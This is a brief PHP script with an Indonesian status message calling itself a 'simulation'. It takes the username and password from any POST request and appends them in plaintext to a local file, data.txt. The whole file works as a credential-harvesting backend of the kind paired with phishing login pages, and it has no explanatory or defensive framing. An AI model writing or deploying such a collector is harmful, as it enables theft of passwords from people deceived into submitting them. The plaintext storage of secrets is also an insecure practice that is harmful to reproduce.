
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $user = $_POST["username"];
  $pass = $_POST["password"];
  $data = "Username: $user | Password: $pass\n";
  file_put_contents("data.txt", $data, FILE_APPEND);
}
echo "Data berhasil disimpan (simulasi).";
?>
